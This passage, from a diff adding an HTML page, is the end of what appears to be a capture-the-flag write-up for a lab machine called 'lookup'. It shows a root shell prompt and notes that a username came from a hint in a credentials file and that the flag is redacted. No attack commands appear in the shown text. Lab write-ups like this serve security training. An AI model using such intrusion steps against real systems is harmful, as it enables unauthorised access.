+</span></span><span style="display:flex;"><span>root@lookup:~#
+</span></span></code></pre></div><hr>
+<h1 id="notes">Notes</h1>
+<p>Thanks for reading! Here are some brief disclaimers you may have wondered while reading the writeup:</p>
+<ol>
+<li>I selected the user <code>think</code> from the hint provided in <code>credentials.txt</code>.</li>
+<li>Inclusions of ellipses <code>...</code> and <code>&lt;SNIP&gt;</code> is to prevent easy retrieval of the flag for this exercise.</li>
+</ol>
+
+</main>
+
+  <footer>
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<script src="//cdn.jsdelivr.net/combine/npm/katex/dist/katex.min.js,npm/katex/dist/contrib/auto-render.min.js,npm/@xiee/utils/js/render-katex.js" defer></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+  
+  </footer>
+  </body>
+</html>
+
